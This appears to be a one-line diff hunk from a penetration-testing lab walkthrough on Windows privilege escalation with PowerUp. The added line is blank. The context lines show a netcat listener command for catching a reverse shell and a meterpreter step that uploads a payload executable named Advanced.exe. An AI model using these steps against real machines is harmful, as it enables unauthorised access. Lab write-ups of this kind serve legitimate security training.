@@ -81,6 +81,7 @@ To enumerate this machine, we will use a powershell script called PowerUp, that'
      nc -lvnp <port>
    ```
  - ![emp img](scrshots/ncstart.png)
+
    **Upload the payload using meterpreter**
    ```bash
       meterpreter > upload Advanced.exe
